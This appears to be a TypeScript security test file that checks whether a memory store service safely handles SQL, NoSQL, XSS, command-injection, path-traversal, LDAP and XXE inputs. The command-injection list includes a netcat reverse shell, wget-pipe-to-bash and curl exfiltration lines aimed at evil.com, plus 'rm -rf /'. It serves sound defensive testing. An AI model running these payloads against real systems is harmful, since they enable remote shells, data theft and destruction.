import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { MemoryStoreService } from '../../src/services/memory-store-service.js';
import { DatabaseManager } from '../../src/db/database-manager.js';

describe('Security Tests - Input Validation and Sanitization', () => {
  let memoryStore: MemoryStoreService;
  let dbManager: DatabaseManager;
  let testUserId: string;

  beforeEach(async () => {
    dbManager = new DatabaseManager();
    await dbManager.initialize();
    memoryStore = new MemoryStoreService(dbManager);
    testUserId = 'test-user-id';
  });

  afterEach(async () => {
    await dbManager.cleanup();
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in search queries', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "'; SELECT * FROM users; --",
        "1' UNION SELECT password FROM users --",
        "'; UPDATE users SET password='hacked' WHERE 1=1; --",
        "'; INSERT INTO users (email,password) VALUES ('attacker@evil.com','hacked'); --",
        "1'; DELETE FROM memory_items; --",
        "'; ALTER TABLE memory_items ADD COLUMN hacked TEXT; --"
      ];

      for (const injection of sqlInjectionAttempts) {
        const result = await memoryStore.find({
          query: injection,
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        // Should not crash or return unexpected data
        expect(result.items).toBeDefined();
        expect(result.items.length).toBeGreaterThanOrEqual(0);

        // Search should be safely escaped
        if (result.items.length > 0) {
          result.items.forEach(item => {
            expect(item.content).not.toContain('DROP TABLE');
            expect(item.content).not.toContain('SELECT password');
            expect(item.content).not.toContain('UNION SELECT');
          });
        }
      }
    });

    it('should prevent SQL injection in scope parameters', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const maliciousScopes = [
        { tenant: "'; DROP TABLE entities; --", org: 'test-org' },
        { tenant: 'test-tenant', org: "1' OR '1'='1" },
        { tenant: "'; SELECT * FROM users; --", org: "'; UPDATE passwords" }
      ];

      for (const maliciousScope of maliciousScopes) {
        const result = await memoryStore.store({
          kind: 'entity' as const,
          content: 'Test content',
          scope: maliciousScope
        }, userContext);

        // Should either reject the malicious scope or handle it safely
        if (!result.success) {
          expect(result.error).toContain('invalid scope');
        } else {
          // If accepted, ensure it was properly escaped/sanitized
          expect(result.storedId).toBeDefined();
        }
      }
    });

    it('should handle NoSQL injection attempts', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const noSqlInjectionAttempts = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'this.password.match(/.*/)' },
        { $or: [{ email: { $ne: null } }, { password: { $ne: null } }] }
      ];

      for (const injection of noSqlInjectionAttempts) {
        // Test in query parameters
        const findResult = await memoryStore.find({
          query: JSON.stringify(injection),
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        expect(findResult.items).toBeDefined();
        expect(findResult.items.length).toBeGreaterThanOrEqual(0);
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    it('should sanitize script tags in content', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload="alert(\'XSS\')">',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '<select onfocus="alert(\'XSS\')" autofocus>',
        '<textarea onfocus="alert(\'XSS\')" autofocus>',
        '<keygen onfocus="alert(\'XSS\')" autofocus>',
        '<video><source onerror="alert(\'XSS\')">',
        '<audio src="x" onerror="alert(\'XSS\')">',
        '<details open ontoggle="alert(\'XSS\')">',
        '<marquee onstart="alert(\'XSS\')">',
        'javascript:alert(\'XSS\')',
        '<style>@import "javascript:alert(\'XSS\')";</style>'
      ];

      for (const payload of xssPayloads) {
        const result = await memoryStore.store({
          kind: 'entity' as const,
          content: payload,
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        if (result.success) {
          // Content should be sanitized
          expect(result.storedContent).not.toContain('<script>');
          expect(result.storedContent).not.toContain('onerror=');
          expect(result.storedContent).not.toContain('onload=');
          expect(result.storedContent).not.toContain('javascript:');
          expect(result.storedContent).not.toContain('alert(');
        } else {
          // Or should be rejected
          expect(result.error).toContain('malicious content');
        }
      }
    });

    it('should prevent XSS in search results', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      // Store content with potential XSS
      const xssContent = '<div>Safe content</div><script>alert("XSS")</script>';

      const storeResult = await memoryStore.store({
        kind: 'entity' as const,
        content: xssContent,
        scope: { tenant: 'test-tenant', org: 'test-org' }
      }, userContext);

      if (storeResult.success) {
        // Search for the content
        const searchResult = await memoryStore.find({
          query: 'Safe content',
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        expect(searchResult.items).toHaveLength(1);
        const retrievedContent = searchResult.items[0].content;

        // Retrieved content should be sanitized
        expect(retrievedContent).not.toContain('<script>');
        expect(retrievedContent).not.toContain('alert(');
        expect(retrievedContent).toContain('Safe content');
      }
    });

    it('should handle encoded XSS attempts', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const encodedXssPayloads = [
        '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E', // URL encoded
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;', // HTML entities
        '\\x3Cscript\\x3Ealert\\x28\\x22XSS\\x22\\x29\\x3C/script\\x3E', // Hex encoded
        '&#60;script&#62;alert&#40;&#34;XSS&#34;&#41;&#60;/script&#62;', // Decimal encoded
        '\\u003cscript\\u003ealert\\u0028\\u0022XSS\\u0022\\u0029\\u003c/script\\u003e' // Unicode encoded
      ];

      for (const payload of encodedXssPayloads) {
        const result = await memoryStore.store({
          kind: 'entity' as const,
          content: payload,
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        if (result.success) {
          // Content should be sanitized or remain encoded (not executed)
          expect(result.storedContent).not.toContain('alert(');
          expect(result.storedContent).not.toMatch(/<script[^>]*>/i);
        }
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in content', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const commandInjectionPayloads = [
        '; cat /etc/passwd',
        '| whoami',
        '&& rm -rf /',
        '`id`',
        '$(id)',
        '; curl http://evil.com/steal-data',
        '| nc -e /bin/sh evil.com 4444',
        '&& wget http://evil.com/malware.sh -O - | bash',
        '; ls -la',
        '`python -c "import os; os.system(\'rm -rf /\')"`',
        '&& ping -c 10 127.0.0.1',
        '; env'
      ];

      for (const payload of commandInjectionPayloads) {
        const result = await memoryStore.store({
          kind: 'entity' as const,
          content: payload,
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        if (result.success) {
          // Content should be stored safely without command execution
          expect(result.storedContent).toBeDefined();
          // Ensure dangerous commands are not executed
          expect(result.storedContent).toContain(payload);
        } else {
          // Or should be rejected
          expect(result.error).toContain('malicious content');
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent path traversal attacks', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
        '..%252f..%252f..%252fetc%252fpasswd', // double URL encoded
        '....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
        '/var/www/../../etc/passwd',
        'file:///etc/passwd',
        '....//....//....//boot.ini'
      ];

      for (const payload of pathTraversalPayloads) {
        const result = await memoryStore.store({
          kind: 'entity' as const,
          content: payload,
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        if (result.success) {
          // Content should be stored safely without path traversal
          expect(result.storedContent).toBeDefined();
          // Ensure file system is not accessed
          expect(result.storedContent).toContain(payload);
        }
      }
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should prevent LDAP injection in search queries', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const ldapInjectionPayloads = [
        '*)(uid=*',
        '*)(|(objectClass=*)',
        '*)(|(password=*',
        '*))(|(cn=*',
        '*)%00',
        '*)\00',
        '*)(cn=*))\00',
        '*)(|(objectClass=*)(&(uid=*',
        'admin)(&(password=*))'
      ];

      for (const payload of ldapInjectionPayloads) {
        const result = await memoryStore.find({
          query: payload,
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        // Should not cause LDAP injection or system compromise
        expect(result.items).toBeDefined();
        expect(result.items.length).toBeGreaterThanOrEqual(0);
      }
    });
  });

  describe('XML External Entity (XXE) Prevention', () => {
    it('should prevent XXE attacks in XML-like content', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const xxePayloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><data>&xxe;</data>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>'
      ];

      for (const payload of xxePayloads) {
        const result = await memoryStore.store({
          kind: 'entity' as const,
          content: payload,
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        if (result.success) {
          // Content should be stored safely without XXE execution
          expect(result.storedContent).toBeDefined();
          // Ensure external entities are not resolved
          expect(result.storedContent).not.toContain('root:'); // /etc/passwd content
          expect(result.storedContent).not.toContain('[boot loader]'); // win.ini content
        }
      }
    });
  });

  describe('Content Type Validation', () => {
    it('should validate and sanitize content types', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const invalidContentTypes = [
        null,
        undefined,
        123,
        {},
        [],
        () => {},
        Symbol('test')
      ];

      for (const invalidContent of invalidContentTypes) {
        const result = await memoryStore.store({
          kind: 'entity' as const,
          content: invalidContent as any,
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        expect(result.success).toBe(false);
        expect(result.error).toContain('invalid content');
      }
    });

    it('should handle extremely long content safely', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      // Test with extremely long string
      const longContent = 'A'.repeat(1000000); // 1MB

      const result = await memoryStore.store({
        kind: 'entity' as const,
        content: longContent,
        scope: { tenant: 'test-tenant', org: 'test-org' }
      }, userContext);

      // Should either accept with size limit or reject gracefully
      if (result.success) {
        expect(result.storedContent).toBeDefined();
        expect(result.storedContent.length).toBeLessThanOrEqual(longContent.length);
      } else {
        expect(result.error).toContain('too large');
      }
    });
  });

  describe('Unicode and Encoding Validation', () => {
    it('should handle malicious Unicode sequences', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org'
      };

      const maliciousUnicode = [
        '\ufeff\u200b\u200c\u200d\u2060\u180e\u061c', // Zero-width characters
        '\u0000\u0001\u0002\u0003\u0004\u0005', // Control characters
        '\u202e\u202d\u202a\u202b\u202c', // Direction override characters
        '\ufff0\ufff1\ufff2\ufff3\ufff4\ufff5\ufff6\ufff7\ufff8\ufff9', // Special Unicode
        '\ud800\udc00', // Surrogate pair
        '\uFEFF\u200B\u200C\u200D\u2060\u180E' // Combination of problematic characters
      ];

      for (const unicode of maliciousUnicode) {
        const result = await memoryStore.store({
          kind: 'entity' as const,
          content: `Test content: ${unicode}`,
          scope: { tenant: 'test-tenant', org: 'test-org' }
        }, userContext);

        if (result.success) {
          // Content should be stored with malicious characters removed or replaced
          expect(result.storedContent).toBeDefined();
          expect(result.storedContent).not.toContain('\u0000'); // Null bytes should be removed
        }
      }
    });
  });
});